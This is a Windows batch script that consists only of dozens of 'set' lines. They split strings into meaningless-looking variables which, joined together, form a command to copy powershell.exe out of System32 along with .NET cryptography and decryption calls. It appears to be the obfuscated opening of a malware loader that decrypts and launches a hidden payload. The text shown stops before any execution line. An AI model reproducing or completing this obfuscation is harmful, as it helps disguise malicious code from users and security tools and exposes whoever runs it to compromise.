@echo off
set "kAhlMneRza=do"
set "yjkiOsDvwP= C"
set "FyTdFlnQHQ=in"
set "kfvBgKeMhw=po"
set "sdBjstyKiP=32"
set "tbwjXEqSjN=:\"
set "dJRJrTjxEg=Po"
set "ReqBHrFVix=xe"
set "tmYIITeEPJ=ow"
set "qGbRtWxbrf=st"
set "nRwxnWxeFd=1."
set "DGRTEczkjH=s\"
set "TjlYMBJxUS=he"
set "aifyRqirzy=\v"
set "fIdrFCxjXf=we"
set "SNAzkTGrbh=rS"
set "PqxCgHGMhf= /"
set "ZaOnzTRzjf=Sy"
set "ZLcHeGkCUf=.e"
set "rEVSHbTawG=rs"
set "xMSBcxsdEJ=ws"
set "PbLdnhwVrC=he"
set "cEvKtWFZzI=\W"
set "jvJZZgsDHj=Wi"
set "pAkWaSoKRs=nd"
set "TZpfckAhFv=0\"
set "srYwEllPfY=we"
set "RKXiLBaTAQ=ll"
set "VAOMoUzbGN=py"
set "cONXFJIrsX=em"
set "aZAGGdYeYH=y "
set "bySFLXIvyb=co"
set "dHmsUOIAWA=ll"
set "lIFjCgdWOS= %~dp0"
set "jjDgucIhkO=cd"
set "PclhiVKnTh=$sKV"
set "qaLSOdcvMu=ypto"
set "UyqVohGtQM== $q"
set "hzmmdenihZ=Disp"
set "HigOgYxmaw= = $"
set "NYzdGWQsuP=.Dis"
set "uvdYckEzTN= if "
set "tjycKxMSqq=UK ="
set "wxhKiwNTCV=$qrl"
set "SUHbdihKNw=join"
set "VuzFWnpJxB=TllA"
set "EPKxriOApv=ionM"
set "ItPDYEBOOS=tem."
set "hhryIWtSol=lBlo"
set "ZuNJHcjkVV=raph"
set "QCRMpadQMG=eam("
set "YcVXrTJrsf=Syst"
set "hkLmWkWJIO== [S"
set "WZIBnHEGsz=.Key"
set "fHXYrrvkPa=ose("
set "HyEoxlsCkG=Bmor"
set "JDJSCkCndU=m(, "
set "ISOByDlGiq=wKs."
set "jzJxwsrgGQ=16] "
set "GWOzcKWxsu=AF.T"
